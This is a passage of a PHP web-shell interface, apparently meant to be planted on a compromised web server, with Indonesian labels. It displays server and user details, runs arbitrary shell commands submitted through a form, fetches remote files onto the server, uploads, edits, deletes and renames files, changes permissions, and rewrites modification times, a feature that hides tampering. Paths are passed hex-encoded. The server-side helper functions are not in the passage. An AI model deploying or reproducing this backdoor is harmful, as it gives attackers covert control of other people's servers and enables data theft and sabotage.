      background-color: #3b5160 !important;
    }

    .feature-buttons-container {
      display: flex;
      flex-wrap: wrap;
      justify-content: center;
      gap: 10px;
      margin: 20px 0;
    }

    .feature-buttons-container .btn-custom {
      max-width: 180px;
      text-align: center;
      flex-grow: 1;
    }

    .content-section {
      background-color: #2a2a2a;
      border: 1px solid #3f3f3f;
      border-radius: 6px;
      padding: 15px;
      margin-bottom: 20px;
    }

    .content-section h5 {
      color: #7faacc;
      margin-bottom: 12px;
      font-size: 16px;
    }

    .content-section .form-group {
      margin-bottom: 10px;
    }

    .text-left {
      text-align: left !important;
    }

    @media (max-width: 768px) {
      .header-title {
        font-size: 1.5rem;
      }

      .main-container {
        padding: 12px;
      }

      .btn-custom,
      .form-control.custom-input {
        width: 100%;
      }

      .file-upload-container {
        flex-direction: column;
      }

      .feature-buttons-container {
        flex-direction: column;
      }

      .feature-buttons-container .btn-custom {
        max-width: 100%;
      }
    }
  </style>

</head>

<body>
  <div class="main-container">
    <div class="text-center mb-4">
      <div class="d-flex justify-content-center align-items-center mb-2">
        <a href="<?php echo $pSelf; ?>" class="header-title mx-2"><?= $f_name ?></a>
      </div>
      <ul class="list-unstyled text-left small-info kecilin">
        <li>System: <span class="text-white"><?php echo htmlspecialchars($sInfo); ?></span></li>
        <li>ID(User/Group): <span class="text-white"><?php echo htmlspecialchars($uGInfo); ?></span></li>
        <li>Server IP: <span class="text-white"><?php echo htmlspecialchars($sIP); ?></span></li>
        <li>Your IP: <span class="text-white"><?php echo htmlspecialchars($cIP); ?></span></li>
        <li>Safe Mode: <span class="text-white"><?php echo htmlspecialchars($sMode); ?></span></li>
        <li>PHP Version: <span class="text-white"><?php echo htmlspecialchars($pVer); ?></span></li>
        <li>Server: <span class="text-white"><?php echo htmlspecialchars($sSoft); ?></span></li>
        <li>Disable Function: <span class="text-white"><?php echo htmlspecialchars($dFnsT); ?></span></li>
        <li><?php echo $tStatL; ?></li>
        <h6 class="text-white mb-2">Direktori Saat Ini: <span class="breadcrumbs">
            <?php
            $pPts = preg_split("/(\\\|\/)/", $cPath, -1, PREG_SPLIT_NO_EMPTY);
            $aPth = '';
            if (DIRECTORY_SEPARATOR === '/') {
              echo "<a href=\"?p=" . eHex('/') . "\" class=\"text-white\">/</a>";
            } else {
              if (preg_match('/^([a-zA-Z]:)/', $cPath, $mtc)) {
                echo "<a href=\"?p=" . eHex($mtc[1] . DIRECTORY_SEPARATOR) . "\" class=\"text-white\">{$mtc[1]}</a>";
              }
            }
            foreach ($pPts as $idx => $pt) {
              if ($pt === '') continue;
              $sep = DIRECTORY_SEPARATOR;
              if (strpos($cPath, ':') === 1 && $idx === 0) {
                $aPth .= $pt;
              } else {
                $aPth .= $sep . $pt;
              }
              $ePth = eHex($aPth);
              echo "<span>" . $sep . "</span><a href=\"?p={$ePth}\" class=\"text-size-info\">{$pt}</a>";
            }
            ?>
          </span></h6>
      </ul>
    </div>

    <div class="content-section">
      <h5 class="text-white mb-3 text-center">Remote File Upload</h5>
      <form method="POST" action="?p=<?php echo eHex($cPath); ?>&a=<?php echo eHex('remote_upload_post'); ?>" class="mb-3 d-flex flex-column align-items-center">
        <div class="form-group w-75">
          <input type="text" name="remote_url" class="form-control custom-input" placeholder="URL Remote File (e.g., https://example.com/file.txt)" required>
        </div>
        <div class="form-group w-75 d-flex align-items-center">
          <input type="text" name="save_as" class="form-control custom-input mr-2" placeholder="Simpan Sebagai (e.g., saved.txt)" required>
          <button type="submit" class="btn-custom">GET</button>
        </div>
      </form>

      <div class="d-flex justify-content-center mt-3">
        <form action="" method="POST" enctype="multipart/form-data" class="file-upload-container" style="max-width: 500px;">
          <input type="file" name="uploaded_filenya" class="custom-input">
          <button type="submit" name="upload_filenya" class="btn-custom">Upload</button>
        </form>
      </div>

      <div class="feature-buttons-container">
        <a href="?p=" class="btn-custom">Home</a>
        <button type="button" class="btn-custom" onclick="sNFile()">New File</button>
        <button type="button" class="btn-custom" onclick="sNFol()">New Folder</button>
        <button type="button" class="btn-custom" onclick="sRUp()">Remote Upload</button>
        <button type="button" class="btn-custom" onclick="sAForm()">Zip</button>
        <button type="button" class="btn-custom" onclick="sEForm()">Unzip</button>
      </div>

      <form method="POST" class="form-inline justify-content-center mb-2">
        <input type="text" name="command" class="form-control custom-input mr-2 flex-grow-1" placeholder="Masukkan Command" style="max-width: 400px;">
        <button type="submit" name="execute_command" class="btn-custom">exe</button>
      </form>
      <?php
      if (isset($_POST["execute_command"]) && isset($_POST["command"])) {
        $cmd = $_POST["command"];
        $cmdOut = rCmd($cmd);
        echo "<pre class='output-box'>" . htmlspecialchars($cmdOut) . "</pre>";
      }
      ?>
    </div>

    <div class="table-responsive flex-grow-1">
      <table class="table table-custom">
        <thead>
          <tr>
            <th style="width: 30%;">Nama</th>
            <th style="width: 15%;">Terakhir Diubah</th>
            <th style="width: 10%;">Ukuran</th>
            <th style="width: 10%;">User/Group</th>
            <th style="width: 10%;">Permission</th>
            <th colspan="3" style="width: 25%;">Aksi</th>
          </tr>
        </thead>
        <tbody>
          <?php
          $itmInDir = scandir($cPath);
          $itmInDir = array_diff($itmInDir, [".", ".."]);

          $pDir = dirname($cPath);
          $isRot = ($cPath === '/' || preg_match('/^[a-zA-Z]:\\\\?$/', $cPath));

          if (!$isRot) {
            echo "<tr>";
            echo "<td class=\"text-left\"><i class=\"fas fa-folder fa-fw icon-folder-orange\"></i><a href=\"?p=" . eHex($pDir) . "\">..</a></td>";
            echo "<td><span class=\"text-white\">- S Y X -</span></td>";
            echo "<td><span class=\"text-size-info\">- S Y X -</span></td>";
            echo "<td><span class=\"text-white\">- S Y X -</span></td>";
            echo "<td><span class=\"text-white\">- S Y X -</span></td>";
            echo "<td></td><td></td><td></td>";
            echo "</tr>";
          }

          $dirs = [];
          $fils = [];
          foreach ($itmInDir as $itm) {
            if (is_dir("{$cPath}/{$itm}")) {
              $dirs[] = $itm;
            } else {
              $fils[] = $itm;
            }
          }

          foreach ($dirs as $dNam) {
            $dPth = "{$cPath}/{$dNam}";
            $mTim = date("Y-m-d H:i", filemtime($dPth));
            $pStr = gPerm($dPth);
            $pCol = is_writable($dPth) ? "text-green" : (is_readable($dPth) ? "text-white" : "text-red");
            $uGrp = gOwnG($dPth);

            echo "<tr>";
            echo "<td class=\"text-left\"><i class=\"fas fa-folder fa-fw icon-folder-orange\"></i><a href=\"?p=" . eHex($dPth) . "\" data-toggle=\"tooltip\" data-placement=\"auto\" title=\"Terakhir diubah: {$mTim}\">" . htmlspecialchars($dNam) . "</a></td>";
            echo "<td><a href=\"#\" onclick=\"sCTim('" . htmlspecialchars($dNam) . "', '" . eHex($dNam) . "', '" . eHex($cPath) . "')\" data-toggle=\"tooltip\" data-placement=\"auto\" title=\"Ubah Waktu Modifikasi\"><span class=\"time-color\">{$mTim}</span></a></td>";
            echo "<td><span class=\"size-color\">--DIR--</span></td>";
            echo "<td><span class=\"text-white\">{$uGrp}</span></td>";
            echo "<td><a href=\"#\" onclick=\"sCPerm('" . htmlspecialchars($dNam) . "', '" . eHex($dNam) . "', '" . eHex($cPath) . "')\" data-toggle=\"tooltip\" data-placement=\"auto\" title=\"Ubah Izin\"><span class=\"{$pCol}\">{$pStr}</span></a></td>";
            echo "<td></td>";
            echo "<td><a href=\"#\" class=\"rename-color\" onclick=\"sRen('" . htmlspecialchars($dNam) . "', '" . eHex($dNam) . "', '" . eHex($cPath) . "', 'd')\" data-toggle=\"tooltip\" data-placement=\"auto\" title=\"Ganti Nama\"><i class=\"fas fa-pen-to-square\"></i>Rename</a></td>";
            echo "<td><a href=\"#\" class=\"delete-item delete-color\" data-type=\"folder\" data-name=\"" . htmlspecialchars($dNam) . "\" data-path=\"" . eHex($cPath) . "\" data-toggle=\"tooltip\" data-placement=\"auto\" title=\"Hapus\"><i class=\"fas fa-trash\"></i>Delete</a></td>";
            echo "</tr>";
          }

          foreach ($fils as $fNam) {
            $fPth = "{$cPath}/{$fNam}";
            if (!is_file($fPth)) {
              continue;
            }

            $fSzKB = filesize($fPth) / 1024;
            $fSz = round($fSzKB, 3);
            $fSz = $fSz > 1024 ? round($fSz / 1024, 2) . " MB" : $fSz . " KB";
            $mTim = date("Y-m-d H:i", filemtime($fPth));
            $pStr = gPerm($fPth);
            $pCol = is_writable($fPth) ? "text-green" : (is_readable($fPth) ? "text-white" : "text-red");
            $uGrp = gOwnG($fPth);

            echo "<tr>";
            echo "<td class=\"text-left\"><i class=\"fas fa-file fa-fw icon-file-white\"></i><a href=\"#\" onclick=\"sVFile('" . htmlspecialchars($fNam) . "', '" . eHex($fNam) . "', '" . eHex($cPath) . "')\" data-toggle=\"tooltip\" data-placement=\"auto\" title=\"Terakhir diubah: {$mTim}\">" . htmlspecialchars($fNam) . "</a></td>";
            echo "<td><a href=\"#\" onclick=\"sCTim('" . htmlspecialchars($fNam) . "', '" . eHex($fNam) . "', '" . eHex($cPath) . "')\" data-toggle=\"tooltip\" data-placement=\"auto\" title=\"Ubah Waktu Modifikasi\"><span class=\"time-color\">{$mTim}</span></a></td>";
            echo "<td><span class=\"size-color\">{$fSz}</span></td>";
            echo "<td><span class=\"text-white\">{$uGrp}</span></td>";
            echo "<td><a href=\"#\" onclick=\"sCPerm('" . htmlspecialchars($fNam) . "', '" . eHex($fNam) . "', '" . eHex($cPath) . "')\" data-toggle=\"tooltip\" data-placement=\"auto\" title=\"Ubah Izin\"><span class=\"{$pCol}\">{$pStr}</span></a></td>";
            echo "<td><a href=\"#\" class=\"edit-color\" onclick=\"sEFile('" . htmlspecialchars($fNam) . "', '" . eHex($fNam) . "', '" . eHex($cPath) . "')\" data-toggle=\"tooltip\" data-placement=\"auto\" title=\"Edit\"><i class=\"fas fa-pen\"></i>Edit</a></td>";
            echo "<td><a href=\"#\" class=\"rename-color\" onclick=\"sRen('" . htmlspecialchars($fNam) . "', '" . eHex($fNam) . "', '" . eHex($cPath) . "', 'f')\" data-toggle=\"tooltip\" data-placement=\"auto\" title=\"Ganti Nama\"><i class=\"fas fa-pen-to-square\"></i>Rename</a></td>";
            echo "<td><a href=\"#\" class=\"delete-item delete-color\" data-type=\"file\" data-name=\"" . htmlspecialchars($fNam) . "\" data-path=\"" . eHex($cPath) . "\" data-toggle=\"tooltip\" data-placement=\"auto\" title=\"Hapus\"><i class=\"fas fa-trash\"></i>Delete</a></td>";
            echo "</tr>";
          }
          ?>
        </tbody>
      </table>
    </div>
  </div>

  <script src="https://code.jquery.com/jquery-3.5.1.slim.min.js"></script>
  <script src="https://cdn.jsdelivr.net/npm/bootstrap@4.6.0/dist/js/bootstrap.bundle.min.js"></script>
  <script type="text/javascript">
    function eHex(str) {
      let hex = '';
      for (let i = 0; i < str.length; i++) {
        hex += str.charCodeAt(i).toString(16);
      }
      return hex;
    }

    function dHex(hStr) {
      let dStr = '';
      for (let i = 0; i < hStr.length; i += 2) {
        dStr += String.fromCharCode(parseInt(hStr.substr(i, 2), 16));
      }
      return dStr;
    }

    const bURL = "<?php echo $pSelf; ?>";
    const cPEnc = "<?php echo eHex($cPath); ?>";

    $(function() {
      $('[data-toggle="tooltip"]').tooltip();

      $(".delete-item").click(function(e) {
        e.preventDefault();
        let typ = $(this).attr("data-type");
        let nam = $(this).attr("data-name");
        let pth = $(this).attr("data-path");

        Swal.fire({
          icon: "warning",
          title: "Apakah Anda Yakin?",
          text: "Ini " + typ + " '" + nam + "' akan dihapus secara permanen.",
          showCancelButton: true,
          confirmButtonColor: '#00a2b8',
          cancelButtonColor: '#00a2b8',
          confirmButtonText: 'Ya, Hapus!',
          cancelButtonText: 'Batal',
          customClass: {
            confirmButton: 'btn-custom-swal',
            cancelButton: 'btn-custom-swal'
          },
          buttonsStyling: false
        }).then((res) => {
          if (res.isConfirmed) {
            let bURL = "?p=" + pth + "&a=" + eHex("delete") + "&n=" + eHex(nam) + "&t=" + ((typ === "folder") ? "d" : "f");
            document.location.href = bURL;
          }
        });
      });
    });

    function sNFile() {
      Swal.fire({
        title: 'Buat File Baru',
        html: `
                <form id="newFileForm" method="POST" action="${bURL}?p=${cPEnc}&a=${eHex('create_file_post')}">
                    <div class="form-group">
                        <input type="text" name="new_file_name" class="form-control custom-input text-center mb-2" placeholder="Nama File Baru" required>
                    </div>
                    <div class="form-group">
                        <textarea name="new_file_content" class="form-control custom-textarea" placeholder="Isi File"></textarea>
                    </div>
                </form>
            `,
        showCancelButton: true,
        confirmButtonText: 'Buat',
        cancelButtonText: 'Batal',
        focusConfirm: false,
        preConfirm: () => {
          document.getElementById('newFileForm').submit();
          return false;
        },
        customClass: {
          popup: 'custom-swal-popup',
          confirmButton: 'btn-custom-swal',
          cancelButton: 'btn-custom-swal'
        },
        buttonsStyling: false
      });
    }

    function sNFol() {
      Swal.fire({
        title: 'Buat Folder Baru',
        html: `
                <form id="newFolderForm" method="POST" action="${bURL}?p=${cPEnc}&a=${eHex('create_folder_post')}">
                    <div class="form-group">
                        <input type="text" name="folder_name" class="form-control custom-input text-center" placeholder="Nama Folder Baru" autocomplete="off" required>
                    </div>
                </form>
            `,
        showCancelButton: true,
        confirmButtonText: 'Buat',
        cancelButtonText: 'Batal',
        focusConfirm: false,
        preConfirm: () => {
          document.getElementById('newFolderForm').submit();
          return false;
        },
        customClass: {
          popup: 'custom-swal-popup',
          confirmButton: 'btn-custom-swal',
          cancelButton: 'btn-custom-swal'
        },
        buttonsStyling: false
      });
    }

    function sEFile(fNam, eFNam, eCPth) {
      let fCURL = `${bURL}?p=${eCPth}&a=${eHex('get_file_content')}&n=${eFNam}`;

      fetch(fCURL)
        .then(res => {
          if (!res.ok) {
            throw new Error('Network response was not ok');
          }
          return res.text();
        })
        .then(cnt => {
          Swal.fire({
            title: `Edit File: ${fNam}`,
            html: `
                        <form id="editFileForm" method="POST" action="${bURL}?p=${eCPth}&a=${eHex('save_edit_post')}&n=${eFNam}">
                            <div class="form-group">
                                <textarea name="edited_content" class="form-control custom-textarea" style="height: 300px;">${eHTML(cnt)}</textarea>
                            </div>
                        </form>
                    `,
            showCancelButton: true,
            confirmButtonText: 'Simpan',
            cancelButtonText: 'Batal',
            focusConfirm: false,
            preConfirm: () => {
              document.getElementById('editFileForm').submit();
              return false;
            },
            customClass: {
              popup: 'custom-swal-popup',
              confirmButton: 'btn-custom-swal',
              cancelButton: 'btn-custom-swal'
            },
            buttonsStyling: false
          });
        })
        .catch(err => {
          Swal.fire('Error', 'Gagal mengambil konten file: ' + err, 'error');
        });
    }

    function sRen(iNam, eINam, eCPth, iTyp) {
      Swal.fire({
        title: `Ganti Nama ${iTyp === 'd' ? 'Folder' : 'File'}: ${iNam}`,
        html: `
                <form id="renameForm" method="POST" action="${bURL}?p=${eCPth}&a=${eHex('save_rename_post')}&n=${eINam}">
                    <div class="form-group">
                        <input type="text" name="new_name" class="form-control custom-input text-center" value="${eHTML(iNam)}" required>
                    </div>
                </form>
            `,
        showCancelButton: true,
        confirmButtonText: 'Simpan',
        cancelButtonText: 'Batal',
        focusConfirm: false,
        preConfirm: () => {
          document.getElementById('renameForm').submit();
          return false;
        },
        customClass: {
          popup: 'custom-swal-popup',
          confirmButton: 'btn-custom-swal',
          cancelButton: 'btn-custom-swal'
        },
        buttonsStyling: false
      });
    }

    function sCPerm(iNam, eINam, eCPth) {
      let cPURL = `${bURL}?p=${eCPth}&a=${eHex('get_perms_string')}&n=${eINam}`;

      fetch(cPURL)
        .then(res => {
          if (!res.ok) {
            throw new Error('Network response was not ok');
          }
          return res.text();
        })
        .then(prm => {
          Swal.fire({
            title: `Ubah Izin: ${iNam}`,
            html: `
                        <form id="changePermsForm" method="POST" action="${bURL}?p=${eCPth}&a=${eHex('save_perms_post')}&n=${eINam}">
                            <div class="form-group">
                                <label for="new_permissions_input" class="text-white">Masukkan izin oktal (contoh: 0755):</label>
                                <input type="text" id="new_permissions_input" name="new_permissions" class="form-control custom-input text-center" value="${eHTML(prm)}" required pattern="^[0-7]{3,4}$" title="Izin harus berupa 3 atau 4 digit angka oktal (0-7)">
                            </div>
                        </form>
                    `,
            showCancelButton: true,
            confirmButtonText: 'Ubah Izin',
            cancelButtonText: 'Batal',
            focusConfirm: false,
            preConfirm: () => {
              const inp = document.getElementById('new_permissions_input');
              if (!inp.checkValidity()) {
                Swal.showValidationMessage(inp.title);
                return false;
              }
              document.getElementById('changePermsForm').submit();
              return false;
            },
            customClass: {
              popup: 'custom-swal-popup',
              confirmButton: 'btn-custom-swal',
              cancelButton: 'btn-custom-swal'
            },
            buttonsStyling: false
          });
        })
        .catch(err => {
          Swal.fire('Error', 'Gagal mengambil izin: ' + err, 'error');
        });
    }

    function sRUp() {
      Swal.fire({
        title: 'Remote Upload',
        html: `
                <form id="remoteUploadForm" method="POST" action="${bURL}?p=${cPEnc}&a=${eHex('remote_upload_post')}">
                    <div class="form-group">
                        <input type="text" name="remote_url" class="form-control custom-input mb-2" placeholder="URL Remote File (e.g., https://example.com/file.txt)" required>
                    </div>
                    <div class="form-group">
                        <input type="text" name="save_as" class="form-control custom-input" placeholder="Simpan Sebagai (e.g., saved.txt)" required>
                    </div>
                </form>
            `,
        showCancelButton: true,
        confirmButtonText: 'GET',
        cancelButtonText: 'Batal',
        focusConfirm: false,
        preConfirm: () => {
          document.getElementById('remoteUploadForm').submit();
          return false;
        },
        customClass: {
          popup: 'custom-swal-popup',
          confirmButton: 'btn-custom-swal',
          cancelButton: 'btn-custom-swal'
        },
        buttonsStyling: false
      });
    }

    function sVFile(fNam, eFNam, eCPth) {
      let fCURL = `${bURL}?p=${eCPth}&a=${eHex('get_file_content')}&n=${eFNam}`;

      fetch(fCURL)
        .then(res => {
          if (!res.ok) {
            throw new Error('Network response was not ok');
          }
          return res.text();
        })
        .then(cnt => {
          Swal.fire({
            title: `Lihat File: ${fNam}`,
            html: `
                        <div class="form-group">
                            <textarea class="form-control custom-textarea" style="height: 300px;" readonly>${eHTML(cnt)}</textarea>
                        </div>
                    `,
            showCancelButton: false,
            confirmButtonText: 'Tutup',
            customClass: {
              popup: 'custom-swal-popup',
              confirmButton: 'btn-custom-swal'
            },
            buttonsStyling: false
          });
        })
        .catch(err => {
          Swal.fire('Error', 'Gagal mengambil konten file: ' + err, 'error');
        });
    }

    function sCTim(iNam, eINam, eCPth) {
      let cTURL = `${bURL}?p=${eCPth}&a=${eHex('get_time_string')}&n=${eINam}`;

      fetch(cTURL)
        .then(res => {
          if (!res.ok) {
            throw new Error('Network response was not ok');
          }
          return res.text();
        })
        .then(tim => {
          Swal.fire({
            title: `Ubah Waktu Modifikasi: ${iNam}`,
            html: `
                        <form id="changeTimeForm" method="POST" action="${bURL}?p=${cPEnc}&a=${eHex('save_time_post')}&n=${eINam}">
                            <div class="form-group">
                                <input type="datetime-local" name="new_time" class="form-control custom-input text-center" value="${fDTIn(tim)}" required>
                            </div>
                        </form>
                    `,
            showCancelButton: true,
            confirmButtonText: 'Ubah Waktu',
            cancelButtonText: 'Batal',
            focusConfirm: false,
            preConfirm: () => {
              document.getElementById('changeTimeForm').submit();
              return false;
            },
            customClass: {
              popup: 'custom-swal-popup',
              confirmButton: 'btn-custom-swal',
              cancelButton: 'btn-custom-swal'
            },
            buttonsStyling: false
          });
        })
        .catch(err => {
          Swal.fire('Error', 'Gagal mengambil waktu modifikasi: ' + err, 'error');
        });
    }

    function fDTIn(dTS) {
      const dat = new Date(dTS);
      if (isNaN(dat.getTime())) {
        return '';
      }
      const yer = String(dat.getFullYear());
      const mon = String(dat.getMonth() + 1).padStart(2, '0');
      const day = String(dat.getDate()).padStart(2, '0');
      const hrs = String(dat.getHours()).padStart(2, '0');
      const min = String(dat.getMinutes()).padStart(2, '0');
      return `${yer}-${mon}-${day}T${hrs}:${min}`;
    }

    function eHTML(txt) {
      const map = {
        '&': '&amp;',
        '<': '&lt;',
        '>': '&gt;',
        '"': '&quot;',
        "'": '&#039;'
      };
      return txt.replace(/[&<>"']/g, function(m) {
        return map[m];
      });
    }

    function sAForm() {
      Swal.fire({
        title: 'Zip Folder',
        html: `
                <form id="zipFolderForm" method="POST" action="${bURL}?p=${cPEnc}&a=${eHex('zip_folder_post')}">
                    <div class="form-group">
                        <label for="sourceFolder" class="text-white">Folder yang akan di-zip:</label>
                        <input type="text" id="sourceFolder" name="source_folder" class="form-control custom-input mb-2" value="${eHTML('<?php echo str_replace('\\', '/', $cPath); ?>')}" required>
                    </div>
                    <div class="form-group">
                        <label for="outputZipFile" class="text-white">Simpan sebagai file zip:</label>
                        <input type="text" id="outputZipFile" name="output_zip_file" class="form-control custom-input" value="${eHTML('<?php echo str_replace('\\', '/', $cPath . DIRECTORY_SEPARATOR); ?>archive.zip')}" required>
                    </div>
                </form>
            `,
        showCancelButton: true,
        confirmButtonText: 'Zip',
        cancelButtonText: 'Batal',
        focusConfirm: false,
        preConfirm: () => {
          document.getElementById('zipFolderForm').submit();
          return false;
        },
        customClass: {
          popup: 'custom-swal-popup',
          confirmButton: 'btn-custom-swal',
          cancelButton: 'btn-custom-swal'
        },
        buttonsStyling: false
      });
    }

    function sEForm() {
      Swal.fire({
        title: 'Unzip File',
        html: `
                <form id="unzipFileForm" method="POST" action="${bURL}?p=${cPEnc}&a=${eHex('unzip_file_post')}">
                    <div class="form-group">
                        <label for="sourceZipFile" class="text-white">File Zip yang akan di-unzip:</label>
                        <input type="text" id="sourceZipFile" name="source_zip_file" class="form-control custom-input mb-2" placeholder="contoh: <?php echo str_replace('\\', '/', $cPath . DIRECTORY_SEPARATOR); ?>archive.zip" required>
                    </div>
                    <div class="form-group">
                        <label for="destinationFolder" class="text-white">Ekstrak ke folder:</label>
                        <input type="text" id="destinationFolder" name="destination_folder" class="form-control custom-input" value="${eHTML('<?php echo str_replace('\\', '/', $cPath); ?>')}" required>
                    </div>
                </form>
            `,
        showCancelButton: true,
        confirmButtonText: 'Unzip',
        cancelButtonText: 'Batal',
        focusConfirm: false,
        preConfirm: () => {
          document.getElementById('unzipFileForm').submit();
          return false;
        },
        customClass: {
          popup: 'custom-swal-popup',
          confirmButton: 'btn-custom-swal',
          cancelButton: 'btn-custom-swal'
        },
        buttonsStyling: false
      });
    }
  </script>
</body>

</html>
